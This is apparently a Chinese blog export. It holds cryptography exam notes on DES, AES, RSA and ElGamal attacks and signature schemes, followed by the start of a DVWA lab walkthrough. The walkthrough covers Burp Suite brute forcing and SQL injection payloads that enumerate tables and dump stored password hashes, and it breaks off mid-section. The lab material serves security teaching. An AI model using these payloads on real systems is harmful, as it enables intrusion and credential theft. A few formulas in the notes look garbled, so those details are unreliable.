轮中的主要运算为\n\n$$\nF_i(L_{i-1},R_{i-1})=(L_{i-1}\\oplus f(R_{i-1},K_i),R_{i-1})\\\\\nF_i^2=F_i(L_{i-1}\\oplus f(R_{i-1},K_i),R_{i-1})\\\\\n=(L_{i-1}\\oplus f(R_{i-1},K_i)\\oplus f(R_{i-1},K_i),R_{i-1})\\\\\n=(L_{i-1},R_{i-1})\\\\\n=I\n$$\n\n​\t\t所以\n$$\nF_i=F_i^{-1}\n$$\n​\t\t所以 F<sub>i</sub> 变换也是对合变化\n\n- 结合以上两步，便可构成 DES 的轮运算\n  $$\n  H_i=F_iT\n  $$\n  因为\n  $$\n  (F_iT)(TF_i)=(F_i(TT)F_i)=F_iF_i=I\n  $$\n  所以\n  $$\n  (F_iT)^{-1}=(TF_i)\\\\\n  (F_iT)=(TF_i)^{-1}\n  $$\n  \n\n### DES的安全性\n\n主要争论为：\n\n- S-盒的设计准则、迭代次数、密钥长度等设计准则\n- 存在**弱密钥和半弱密钥**\n  - 弱密钥：初始密钥 K 使得种子秘钥两部分的每一部分的所有位置全为0或1，则经子密钥产生器产生的各个子密钥都相同。这样的密钥共有4个，分别是0000000 0000000、0000000 FFFFFFF、FFFFFFF 0000000、FFFFFFF FFFFFFF \n    - E<sub>k</sub> (E<sub>k</sub> (m)) = m 和 D<sub>k</sub> (D<sub>k</sub> (m)) = m\n  - 半弱密钥：把明文加密成相同的密文，即存在两个不同的密钥，使得加密同一明文的到的结果相同。\n  - 弱密钥占比非常小，对安全性威胁不大\n- 56位密钥**无法抵抗穷举攻击**\n- 代数结构存在**互补对称性**：互补性会使DES在选择明文攻击下所需要的工作量减半，仅需要测试 2<sup>55</sup> 个密钥。\n\n$$\n\\begin{cases}\nc_{1} = E_{k}(m) \\\\\nc_{2} = E_{k}(\\overline{m}) \n\\end{cases}\n$$\n\n由互补性得到\n$$\n\\overline{c_{2}} = E_{\\overline{k}}(m)\n$$\n在穷举密钥 k 时，若输出密文是 c，则加密密钥就是所应用的密钥；若输出密文是 c 的补，则加密密钥就是所用密钥 k 的补\n\n### 多重DES分析\n\n- **双重DES**：无能抵抗中途相遇攻击\n\n$$\n加密：C = E_{K_{2}}(E_{k_{1}}(P)) \\\\\n解密：P = D_{K_{1}}(D_{k_{2}}(C)) \\\\\n由上可推出\\\\\nX = E_{k_{1}}(P) = D_{k_{2}}(C)\\\\\nX 为中间值\n$$\n\n给定明密文对 (P, C) ，将 P 按所有可能密钥 K<sub>1</sub> 加密，得到结果排列与表 T 中；将 C 用所有可能密钥 K<sub>2</sub> 解密，每解密一次就将解密结果与 T 中的值比较。**若有相等，就用刚才测试的两个密钥对 P 加密，若结果为 C 则认定这两个密钥时正确的密钥**。\n\n- **三重DES**：有四种方式，分别是 EEE3、EDE3、EEE2、EDE2，其中的数值表示密钥数量\n\n## 🌟高级加密标准AES\n\n本课程中的AES中运算按**字节**（8位二进制）定义\n\n- 一个字节看成优先于上次数小于 8 的多项式\n\n多项式加法：\n\n![lZw8xg.png](https://s2.ax1x.com/2019/12/27/lZw8xg.png)\n\n🌟**多项式乘法：**有限域 GF(2<sup>8</sup>) 中两个元素的乘法为**模** 2 元域 GF(2) 上的**一个 8 次不可约多项式的多项式**乘法。对于 AES，该8次不可约多项式为\n$$\nm(x)=x^{8}+x^{4}+x^{3}+x+1\n$$\n用十六进制表示为**{9B}**\n\n![lZwvJf.png](https://s2.ax1x.com/2019/12/27/lZwvJf.png)\n\n![lZ0Fwn.png](https://s2.ax1x.com/2019/12/27/lZ0Fwn.png)\n\n🌟**X乘法**（乘2情况）：\n\n- 最高位是 0：直接左移 1 位\n- 最高位是1：左移 1 位后和 `00011011` 异或\n\n$$\nx*B(x)=\\begin{cases}(b_{6}b_{5}b_{4}b_{3}b_{2}b_{1}b_{0}0) &\\text{b7=0} \\\\(b_{6}b_{5}b_{4}b_{3}b_{2}b_{1}b_{0}0)\\oplus(00011011)&\\text{b7=1}\\end{cases}\n$$\n\n![lZBwgU.png](https://s2.ax1x.com/2019/12/27/lZBwgU.png)\n\n**乘 3 乘法：**\n\n3 = (0000 0011)<sub>2</sub> 可以拆分为 (0000 0001)<sub>2</sub> 和 (0000 0010)<sub>2</sub> ，再将两个乘积异或：\n$$\n(0000 0011)(a_7a_6a_5a_4a_3a_2a_1a_0)\\\\\n=[(00000010)\\oplus(00000001)]*(a_7a_6a_5a_4a_3a_2a_1a_0)\\\\\n=[(00000010)*(a_7a_6a_5a_4a_3a_2a_1a_0)]\\oplus(a_7a_6a_5a_4a_3a_2a_1a_0)\n$$\n\n### AES结构\n\n- 明文按字节分成列组（共16字节）\n\n- 128位密钥被扩展成**44个字**组成的序列 W[ i ]\n\n- AES每轮有四个阶段\n\n  - 字节代换：S-盒和逆S-盒，简单查表\n  - 行移位：简单左循环移位操作，状态矩阵中，第 i 行循环左移 i 字节；逆操作则右移\n  - 🌟**列混合**：对状态矩阵逐列变换，每列视为有限域 GF(2<sup>8</sup>)上一多项式。列多项式乘以一个**固定多项式 c(x)**，对应四字节向量为（03 01 01 02），模多项式为（x<sup>4</sup> + 1）\n\n  [![luyui4.md.png](https://s2.ax1x.com/2019/12/29/luyui4.md.png)](https://imgchr.com/i/luyui4)\n\n  ![lJV39S.png](https://s2.ax1x.com/2020/01/01/lJV39S.png)\n\n  - 轮密钥加：轮密钥与状态按比特逐位异或\n\n  ![lugWfe.png](https://s2.ax1x.com/2019/12/29/lugWfe.png)\n\n- 每个阶段可逆，解密的一轮就是加密的逆执行\n\n- 加解密的最后一阶段（**第10轮**）只有三个阶段（**没有列混合**）\n\n**密钥扩展**\n\n将初始 128 位密钥，输入一个 4x4 矩阵，4 列依次为 w[ 0 ]、w[ 1 ]、w[ 2 ]、w[ 3 ]，接着对 w 数组扩充到 40 个新列，总共构成 44 列，采用以下递归方式构成\n$$\nw[i] =\\left\\{ \n\\begin{array}{}\n     w[i-4]\\oplus w[i-1] & \\text{i不是4的倍数}\\\\ \n     w[i-4]\\oplus T(w[i-1]) & \\text{i是4的倍数}\n\\end{array}\n\\right.\n$$\nT 是一个复杂函数，有字循环，字代替和轮常量异或三个组成部分，其中引用了S-盒。\n\n### IDEA和SMS4\n\n- IDEA分组大小为64位，密钥为 128 位；它的种子密钥为 128 位。在加密中，由8轮和随后的一个输出变换组成。共用 52 组 16 位的子密钥，子密钥主要通过初始密钥移位得到。\n- SMS4，分组长度 128 比特，密钥长度 128 比特，加解密采用32轮非线性迭代，加解密轮密钥顺序相反。\n\n### 🌟分组密码工作模式\n\n**电码本模式（ECB）**\n\n相同明文分组加密成相同的密文分组，明文分成 64 的分组进行加密，不足 64 位时进行填充\n\n![lKMeDP.png](https://s2.ax1x.com/2019/12/29/lKMeDP.png)\n\n特点\n\n- 简易，可并行计算，速度快\n- 相同密钥作用下，相同明文加密产生相同密文，暴露明文特征\n- 密文块缺乏相关，易受替换、重复等攻击\n\n**密码分组链接模式（CBC）**\n\n加密输入是当前明文分组和前一密文分组的异或，形成一条链。密文组不仅与当前明文组有关，且通过反馈以前的明文组有关\n\n![lKMrvR.png](https://s2.ax1x.com/2019/12/29/lKMrvR.png)\n\n![lKM6Dx.png](https://s2.ax1x.com/2019/12/29/lKM6Dx.png)\n\n🌟CBC的传播错误：\n\n- **明文有一分组有错**，会使以后的密文组都收到影响，但经过解密，除原来有误的一组外，其后各组明文都正确恢复\n- 传送过程中**某组密文出错时**，则该组恢复的明文和下一组恢复数据出错，再后面的组不受影响\n\n**密码反馈模式（CFB）**\n\n输入是 64 比特的移位寄存器，初值为初始向量 IV，输出最左边 j 比特与明文第一个单元 P<sub>1</sub> 进行异或，产生密文的第一个单元 C<sub>1</sub> 。然后将移位寄存器左移 j 位，并将 C<sub>1</sub> 送入移位寄存器的最右边 j 位，直至所有单元被加密\n\n![lKGYr9.png](https://s2.ax1x.com/2019/12/29/lKGYr9.png)\n\n![lKJezD.png](https://s2.ax1x.com/2019/12/29/lKJezD.png)\n\n优点：自同步能力强，可处理任意长度消息\n\n缺点：\n\n- **明文某一组中有错**，使以后的密文组都受影响，但经解密后，除原有误的一组外，其后各组都正确地恢复\n- **密文里的一位错误**会引起明文的一个单独错误，此错误进入移位寄存器，导致密文成为无用信息，直到该错误从移位寄存器中移出\n\n**输出反馈模式（OFB）：**\n\n反馈模式结构与CFB结构类似，不同在于\n\n- OFB模式将加密算法的输出反馈到移位寄存器\n\n![lMyh6A.png](https://s2.ax1x.com/2019/12/30/lMyh6A.png)\n\n![lMyHk8.png](https://s2.ax1x.com/2019/12/30/lMyHk8.png)\n\n特点：\n\n可加密任意长度数据，没有错误传播，适用于加密冗余度较大的数据，但对密文的篡改难以检测\n\n**计数器模式（CTR）：**\n$$\n加密：c_i = m_i \\oplus E_k(CTR+i) (i = 1,2,...,n) \\\\\n解密：m_i = c_i \\oplus E_k(CTR+i) (i=1,2,...,n)\n$$\nCTR表示计数器初值\n\n![lM6KAK.png](https://s2.ax1x.com/2019/12/30/lM6KAK.png)\n\n特点：\n\n- 随机访问特性：可随机对任一个密文分组解密，且与其他密文无关\n- 高效率：能并行处理\n- 可处理任意长度数据，仅涉及加密运算，不用实现解密算法\n\n\n\n## 第五章：哈希函数\n\n哈希函数：将任意长的消息 M 变换为较短的、固定长度的值 H(M) 的不可逆的单选密码体制，其中 H(M) 称为消息摘要，又称数字指纹\n\n基本特征：\n\n- 算法公开，无需密钥\n- 数据压缩\n- 易于计算\n- 🌟**单向性**（抗原像性）：给定消息的散列值 h(m) ，要得到消息 m 在计算上不可行\n\n**Hash 函数安全性要求：**\n\n- 抗弱碰撞性：给定消息 m ，寻找与 m 不同的消息 m' ，使得 h(m) = h(m') 在计算上不可行\n- 抗强碰撞性：寻找两个不同消息 m 和 m'，使得 h(m) = h(m') 在计算上不可行\n\n### MD5\n\n分组长度为 512 比特，最终输出 128 位（即 16 字节，32 个十六进制位）的消息摘要。\n\n过程为 4 轮，每轮 16 步，共 64 步。\n\n### SHA1\n\n最终输出 160 位（即 20 字节，40 个十六进制位）的消息摘要。（因此比 MD5 抗穷举能力更强）\n\n过程为 4 轮，每轮 20 步，共 80 步。\n\n### 🌟数据填充\n\n- 填充一个 “1” 和若干个 “0” 使消息长度**模 512 与 448 同余**。\n- 将**原始消息长度以 64 比特表示**附加在填充结果后面，使得消息长度恰好为 512 比特整数倍\n- 512 比特按 32 比特分为 16 组\n- 若原消息长度刚好满足这个条件，则再填充 512 位（1 个 1 和 511 个 0）。\n\n\n\n> 例题：给定一个三个 8 位 ASCII 字符组成的消息 “abc” ，总长度为 l = 24 位\n\n![lMIqQf.png](https://s2.ax1x.com/2019/12/30/lMIqQf.png)\n\n\n\n## 第六章：公钥密码\n\n单向陷门函数 f ：\n\n- 给出 f 定义域中的任意元素 x，计算 f(x) 是容易的\n- 给出 y = f(x) 中的 y，计算 x：\n  - 若知道 f 结合进去的信息（**陷门，也称密钥**），则 x 容易计算\n  - 若不知道该陷门信息，则 x 难以计算\n\n公钥密码应满足：\n\n- 解密算法 D 与加密算法 E 互逆，对于所有明文都有\n\n$$\nD(E(M,K_e),K_d) = M\n$$\n\n- 由 K<sub>e</sub> 求出 K<sub>d</sub> 在计算上不可行\n- 算法 E 和 D 都是高效的\n\n优点：\n\n- 密钥分发简单\n- 需保密的密钥量少\n- 可满足互不相识的人之间私人对话的保密性\n- 可实现数字签名和认证功能\n\n相对于对称密码的不足\n\n- 密码算法较慢\n- 提供更多信息对算法进行攻击\n- 数据扩展\n- 建立在特定的数学难题上，这种困难性只是一种设想\n\n## 🌟RSA\n\n### 🌟**RSA算法描述**：\n\n- 密钥生成\n  - 选择两个大素数 p 和 q，（p ≠ q，需保密）\n  - 计算 n = p x q，φ(n) = (p-1) × (q-1)\n  - 选择整数 e 使 (φ(n), e) = 1, 1 < e < φ(n)\n  - 计算 d，使得 d = e<sup>-1</sup> mod φ(n)\n  - 得到：**公钥为 {e，n}**；**私钥为 {d}**\n- 加密（用e，n）：明文 M < n，密文 C = M<sup>e</sup> (mod n)\n- 解密（用d，n）：密文 C，明文 M = C<sup>d</sup> (mod n)\n\n计算时，求 d 时，使用欧几里得扩展算法列表运算\n\n**正确性验证(欧拉定理)：**\n$$\nC^d \\mod n=(M^e)^d \\mod n\\\\=M^{ed} \\mod n\\\\=M\\mod n\n$$\n\n### **🌟RSA的攻击**\n\n#### 同模攻击：\n\n假设 m 是明文，两用户的公钥分别是 e<sub>1</sub> 和 e<sub>2</sub> ，且 ( e<sub>1</sub> ,e<sub>2</sub> ) = 1，共同模数 N ，两密文为\n$$\nc_1 \\equiv m^{e_1}\\mod N\\\\\nc_2 \\equiv m^{e_2}\\mod N\n$$\n攻击者知道 N, e<sub>1</sub> , e<sub>2</sub>, c<sub>1</sub> 和 c<sub>2</sub>，可如下恢复明文 m\n\n ( e<sub>1</sub> ,e<sub>2</sub> ) = 1，由欧几里得算法可找出 r, s 满足 re<sub>1</sub> + se<sub>2</sub> = 1。假定 r 是负数，那么\n$$\n(c_1^{-1})^{-r}c_2^s=m^{re_1+se_2}\\equiv m\\mod N\n$$\n无需密钥 d，就可得到明文 m\n\n**防御：**使用 RSA 公钥密码的通信中，不同用户的密钥不能有相同的模值\n\n#### 低加密指数攻击：\n\n小的公钥可加快加密速度，但过小公钥易受攻击\n\n三个用户都使用 3 作为公钥，对同一明文 m 加密\n$$\nc_1\\equiv m^e \\mod n_1\\\\\nc_2\\equiv m^e \\mod n_2\\\\\nc_3\\equiv m^e \\mod n_3\n$$\n运用中国剩余定理，在 e = 3 时，可以得到\n$$\nc_x\\equiv m^3\\mod n_1n_2n_3\n$$\n所以\n$$\nm=\\sqrt[3]{c_x}\n$$\n**防御：**对短消息，用随机数填充以保证 \n$$\nm^e\\mod n\\neq m^e\n$$\n从而杜绝低加密指数攻击\n\n \n\n## 🌟ElGamal\n\n### **🌟ElGamal算法描述：**\n\n- 密钥的生成\n\n  - 选取大素数 p、g ∈ Z<sub>p</sub><sup>*</sup> 是一个生成元，p、g 作为系统参数所有用户共享\n  - 每个用户 U 都随机挑选整数 x，2 ≤ x ≤ p-2，计算\n\n  $$\n  y=g^x\\mod p\n  $$\n\n  - **y 作为用户 U 的公钥，x 作为用户 U 的私钥**\n\n- 加密\n\n  - 用户 A 把明文编码为一个 0 ~ p-1 之间的整数 m\n\n  - A 挑选一个秘密随机数 r （2 ≤ r ≤ p-2）\n    $$\n    c_1=g^r\\mod p \\\\\n    c_2 = m*y^r\\mod p\n    $$\n\n  - A 把二元组（c1, c2）作为密文传送给用户 B。\n\n- 解密\n\n  - B 收到密文二元组后，做解密计算\n    $$\n    m=c_2*(c_1^x)^{-1}\\mod p\n    $$\n\n**算法正确性验证：**\n$$\nc_2(c_1^x)^{-1}\\mod p=(y^rm)(g^{rx})^{-1} \\mod p \\\\\n=(g^{xr}m)g^{-rx}\\mod p \\\\\n=m\\mod p\n$$\n\n> ps: 安全性分析 8 考\n\n## 第七章：数字签名\n\n数字签名的目的：保证信息的完整性和真实性\n\n完善的签名方案应满足的条件：\n\n- 不可否认性\n- 不可伪造性\n- 公正的仲裁\n\n## 🌟RSA数字签名方案\n\n### 签名算法如下：\n\n- 生成密钥（与加密系统一样）\n\n- 签名过程 (d, n)：\n\n  用户 A 对消息 M ∈ Z<sub>n</sub> 进行签名，计算\n  $$\n  S = Sig(H(M)) = H(M)^d \\mod n\n  $$\n  并将 S 附在消息 M 后，发送\n\n- 验证过程 (e, n)：\n\n  给定 (M, S) ，Ver(M, S)为真，则下式成立\n  $$\n  H(M) = S^e \\mod n\n  $$\n\n- 正确性\n\n  因为\n  $$\n  s\\equiv h(m)^d\\mod n\\\\\n  de \\equiv 1\\mod \\varphi(n)\\\\\n  \\varphi(n)=(p-1)(q-1)\n  $$\n  所以\n  $$\n  s^e\\equiv h(m)^{ed}\\equiv h(m)^{k\\varphi(n)+1}\\equiv h(m)h(m)^{k\\varphi(n)}\\\\\n  \\equiv h(m)[h(m)^{\\varphi(n)}]^k\\equiv h(m)\\mod n\n  $$\n\n### 安全性\n\n**如果不加 Hash 函数，直接对消息进行签名**\n\n**一般攻击：**\n\n攻击者任选一个数据 Y，用 A 的公钥计算 X = Y<sup>e</sup> mod n，便可以用 Y 伪造 A 对消息 X 的签名\n$$\nY = X^d \\mod n\n$$\n**利用已有签名进行攻击:**\n\n如果消息 M<sub>1</sub>、M<sub>2</sub> 的签名分别是  S<sub>1</sub>、S<sub>2</sub>，则任何指导 M<sub>1</sub>、M<sub>2</sub>  ，S<sub>1</sub>、S<sub>2</sub> 的人可以伪造对消息 M<sub>1</sub>、M<sub>2</sub> 的签名  S<sub>1</sub>、S<sub>2</sub>，因为\n$$\nSig(M_1,M_2) = Sig(M_1)Sig(M_2)\n$$\n**利用签名获得明文:**\n\n截获 C＝M<sup>e</sup> mod n，选择随机数 r，计算\n$$\nx = r^e \\mod n\\\\\ny = xC\\mod n\n$$\n设法让发送者对 y 签名，获得\n$$\nS = y^d\\mod n\n$$\n攻击者计算\n$$\nr^{-1}S\\mod n=r^{-1}y^d\\mod n\\\\\n=r^{-1}x^dC^d\\mod n=C^d\\mod n=M\n$$\n\n\n其中 H(M) 的另外一个作用就是可以**加快签名速度**。\n\n\n\n## 🌟ElGamal数字签名方案\n\n### 签名算法如下：\n\n- 系统初始化：选择大素数 p，选择生成元  g ∈ Z<sub>p</sub><sup>*</sup> 和随机数 x ∈ <sub>R</sub>Z<sub>p</sub>。\n\n  公钥 (p, g, y)，私钥为 x (1 ≤ x ≤ p-1)，其中 \n  $$\n  y=g^x\\mod p\n  $$\n\n- 签名过程：给定消息 M，签名者如下计算\n\n  - 选择随机数 k ∈ Z<sub>p</sub><sup>*</sup>，且 k 与 (p-1) 互素\n\n  - 计算 M 的哈希值 H(M) ，计算\n    $$\n    r = g^k\\mod p\\\\\n    s=(H(M)-xr)k^{-1}(\\mod p-1)\n    $$\n\n  - 将 (r, s) 作为签名，与 M 一起发送给接收方\n\n- 签名验证\n\n  - 计算消息 M 哈希值 H(M)\n\n  - 验证公式\n    $$\n    y^rr^s=g^{H(M)}\\mod p\n    $$\n    成立则认为 (r, s)为有效签名，否则认为签名是伪造的\n\n- 正确性\n  $$\n  ks\\equiv h(m)-xr\\mod (p-1)\\\\\n  g^{ks}\\equiv g^{h(m)-xr}\\mod p\\\\\n  g^{ks}g^{xr}\\equiv g^{h(m)}\\mod p\\\\\n  y^rr^s=g^{H(m)}\\mod p\n  $$\n\n安全性：\n\n- 非确定性数字签名算法，同一消息 M 的签名依赖于随机数 k\n\n- 安全性基于有限域上计算离散对数的困难性（DLP）\n\n  实际中常用本原元 α 生成一个阶为素数的子群，所有元素都是本原元，不存在子群，从而抵抗这种攻击。\n\n- 随机数 k 不能泄露（已知 k 可以计算 x ）\n\n- 随机数 k 不能被重复使用（泄露 x ）\n\n  设 k 用来对两个不同消息签名，则 r 相同。签名分别为 (r, s<sub>1</sub>), (r, s<sub>2</sub>)。因为\n  $$\n  s_1\\equiv [h(m_1)-xr]k^{-1}\\mod (p-1)\\\\\n  s_2\\equiv [h(m_2)-xr]k^{-1}\\mod (p-1)\\\\\n  (s_1-s_2)k\\equiv [h(m_1)-h(m_2)]\\mod (p-1)\n  $$\n  因为消息 m<sub>1</sub>，m<sub>2</sub> 不同，他们所以签名不同的概率很大，则\n  $$\n  k\\equiv [h(m_1)-h(m_2)](s_1-s_2)^{-1}\\mod (p-1)\n  $$\n  之后可以将 k 代入上面两式来计算私钥\n  $$\n  x\\equiv \\frac{h(m_1)-s_1k}{r}\\mod p-1\n  $$\n\n- 哈希函数的应用\n\n  如果未使用 Hash 函数则易受到攻击。攻击者选取任一整数对 (u, v)，满足\n  $$\n   gcd(v, p-1)=1\n  $$\n  计算\n  $$\n  r\\equiv g^uy^v\\mod p\\\\\n  s\\equiv -rv^{-1}\\mod (p-1)\\\\\n  m\\equiv su\\mod p\n  $$\n  则消息 m 及其签名 (r, s) 可以被验证者接受，即攻击者成功进行存在性伪造。因为\n  $$\n  y^rr^s\\equiv y^r(g^ug^v)^s\\equiv y^{r+w}g^{us}\\equiv g^m\\mod p\n  $$\n  又因为\n  $$\n  g^m\\equiv g^{su}\\mod p\n  $$\n  也就是说，签名 (r, s) 使等式\n  $$\n  y^rr^s=g^{m}\\mod p\n  $$\n  成立\n\n  所以使用 Hash 函数能够有效提高 ElGamal 数字签名方案安全性。\n\n## Schnorr签名体制\n\n### 签名算法如下：\n\n- 系统初始化：p、q 大素数，选择生成元 g ∈ Z<sub>p</sub><sup>*</sup> ，且 \n  $$\n  g^q\\equiv 1\\mod q\\ne 1\n  $$\n  选择随机数 1 < x < q，计算\n  $$\n  y\\equiv g^x\\mod p\n  $$\n  公钥为（p, q, g, y），私钥为（ x ）\n\n- 签名算法\n\n  签名者选取随机数 k，1 ≤ k ≤ q-1，计算\n  $$\n  r\\equiv g^k\\mod p\\\\\n  e= h(m,r)\\\\\n  s\\equiv (xe+k)\\mod q\n  $$\n  计算得签名 (e, s)，其中 h 为安全的 Hash 函数\n\n- 验证算法\n\n  收到消息 m 和签名 (e, s)，计算\n  $$\n  r_1\\equiv g^sy^{-e}\\mod p\n  $$\n  验证\n  $$\n  e=h(m,r_1)\n  $$\n  等式成立则签名有效；否则无效\n\n- 正确性\n\n  因为\n  $$\n  r\\equiv g^k\\mod p\\\\\n  e= h(m,r)\\\\\n  s\\equiv (xe+k)\\mod q\n  $$\n  所以\n  $$\n  r_1\\equiv g^sy^{-e}\\equiv g^sg^{-xe}\\equiv g^{s-xe}\\\\\n  \\equiv g^{xe+k-xe}\\equiv g^k\\equiv r\\mod p\n  $$\n  因此\n  $$\n  h(m, r_1)=h(m,r)=e\n  $$\n\n安全性：\n\nSchnorr数字签名方案中 g 为 Z<sub>p</sub><sup>*</sup> 的 q 阶子群的生成元，较 Elgamal 签名方案的生成元阶为 p-1。所以从穷尽搜索签名者密钥的角度，Elgamal 签名安全性更高。除此之外，安全性与 Elgamal 签名方案相同。\n\n\n\n\n\n> 试卷题型\n>\n> > 计算题（60分） \n> >\n> > 6道或8道\n>\n> > 分析题（20分）\n> >\n> > 4个小题\n>\n> > 综合题（20分）\n> >\n> > 3个小题或2个小题\n\n","tags":["密码学"]},{"title":"DVWA部分复现（Brute Force、SQL Injection、SQL Injection (Blind)、XSS（Reflected）、XSS（Stored））","url":"/2019/12/09/dwva-bruteforce/","content":"\n### Brute Force\n\n#### low级别\n\n![QMFPu6.png](https://s2.ax1x.com/2019/12/03/QMFPu6.png)\n\n**爆破利用burpsuite即可完成**\n\n抓包，并送至intruder\n\n![QMFUvq.png](https://s2.ax1x.com/2019/12/03/QMFUvq.png)\n\n选择爆破点password和字典开始爆破\n\n![QMFs54.png](https://s2.ax1x.com/2019/12/03/QMFs54.png)\n\n点击页面长度进行排序，可看到密码为`password`返回的页面长度与别的明显不同\n\n![QMFoIe.png](https://s2.ax1x.com/2019/12/03/QMFoIe.png)\n\n载入详情，查看渲染，回显登录成功，由此爆破出密码为`password`。\n\n![QMkPRs.png](https://s2.ax1x.com/2019/12/03/QMkPRs.png)\n\n#### medium级别\n\n查看源代码如下\n\n```php\n<?php\nif( isset( $_GET[ 'Login' ] ) ) {\n    // Sanitise username input\n    $user = $_GET[ 'username' ];\n    $user = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $user ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n    // Sanitise password input\n    $pass = $_GET[ 'password' ];\n    $pass = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n    $pass = md5( $pass );\n\n    // Check the database\n    $query  = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\";\n    $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $query ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );\n    if( $result && mysqli_num_rows( $result ) == 1 ) {\n        // Get users details\n        $row    = mysqli_fetch_assoc( $result );\n        $avatar = $row[\"avatar\"];\n\n        // Login successful\n        echo \"<p>Welcome to the password protected area {$user}</p>\";\n        echo \"<img src=\\\"{$avatar}\\\" />\";\n    }\n    else {\n        // Login failed\n        sleep( 2 );\n        echo \"<pre><br />Username and/or password incorrect.</pre>\";\n    }\n    ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n}\n?> \n```\n\n比low级别增加了`mysqli_real_escape_string() `函数，此函数会转义在 SQL 语句中使用的字符串中的特殊字符。可以抵御sql注入。登录失败会做`sleep(2)`但仍可以进行爆破，可用同low方法进行爆破，只是速度会变慢。\n\n#### high级别\n\n查看源代码如下\n\n```php\n<?php\nif( isset( $_GET[ 'Login' ] ) ) {\n    // Check Anti-CSRF token\n    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );\n    // Sanitise username input\n    $user = $_GET[ 'username' ];\n    $user = stripslashes( $user );\n    $user = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $user ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n    // Sanitise password input\n    $pass = $_GET[ 'password' ];\n    $pass = stripslashes( $pass );\n    $pass = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n    $pass = md5( $pass );\n\n    // Check database\n    $query  = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\";\n    $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $query ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );\n\n    if( $result && mysqli_num_rows( $result ) == 1 ) {\n        // Get users details\n        $row    = mysqli_fetch_assoc( $result );\n        $avatar = $row[\"avatar\"];\n\n        // Login successful\n        echo \"<p>Welcome to the password protected area {$user}</p>\";\n        echo \"<img src=\\\"{$avatar}\\\" />\";\n    }\n    else {\n        // Login failed\n        sleep( rand( 0, 3 ) );\n        echo \"<pre><br />Username and/or password incorrect.</pre>\";\n    }\n    ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n}\n// Generate Anti-CSRF token\ngenerateSessionToken();\n?>\n```\n\n对比medium级别，username和password的过滤机制增加了`stripslashes() `函数，可以进一步的抵御sql注入，代码加入了user_token，每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。并在结尾处增加了`sleep( rand( 0, 3 ) )`登录失败的延时机制。low方式无法再次使用。每次登录都要提交Login、user_token、username和password。\n\n代理抓包，发送至intruder，选择Pitchfork攻击方式，并确认爆破点password和user_token\n\n![QMlEOe.png](https://s2.ax1x.com/2019/12/03/QMlEOe.png)\n\n在options栏找到Grep - Extract，点击Add。\n\n![QMltTs.png](https://s2.ax1x.com/2019/12/03/QMltTs.png)\n\n点击Refetch response，进行一个请求，即可看到响应报文，直接选取需要提取的token\n\n![QMtlUe.png](https://s2.ax1x.com/2019/12/03/QMtlUe.png)\n\n设置payload1为常用密码\n\n![QMtB5Q.png](https://s2.ax1x.com/2019/12/03/QMtB5Q.png)\n\n设置payload2，选择payload type为“Recursive grep”\n\n![QMtoG9.png](https://s2.ax1x.com/2019/12/03/QMtoG9.png)\n\n开始爆破，查看爆破结果，爆破成功，密码password\n\n![QMN9xI.png](https://s2.ax1x.com/2019/12/03/QMN9xI.png)\n\n\n\n### SQL Injection\n\n#### low级别\n\n![image.png](https://i.loli.net/2019/12/03/63LydJsGWtjeQIO.png)\n\n输入`1' and '1'='1`，回显正常id=1的情况，存在SQL注入\n\n![image.png](<https://i.loli.net/2019/12/03/buUpDNHmhsBtTkg.png>)\n\n之后猜测SQL语句字段数，输入`1' order by 3 #` ，提示不存在，由此判断查询语句存在2字段。\n\n![image.png](https://i.loli.net/2019/12/03/d5Oos6fS2rKTQa8.png)\n\n之后可用`1′ union select 1,database() #`查询数据库\n\n![image.png](https://i.loli.net/2019/12/03/TjgIWwQpKOdmVFH.png)\n\n查表`1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`\n\n![image.png](https://i.loli.net/2019/12/03/tWDmjkMqE4QoHiI.png)\n\n查字段名`1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`\n\n![image.png](https://i.loli.net/2019/12/03/QCw1hrlXDN4FPyo.png)\n\n查字段值`1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`\n\n![image.png](https://i.loli.net/2019/12/03/uvRCBSrXeDNw9HU.png)\n\n#### 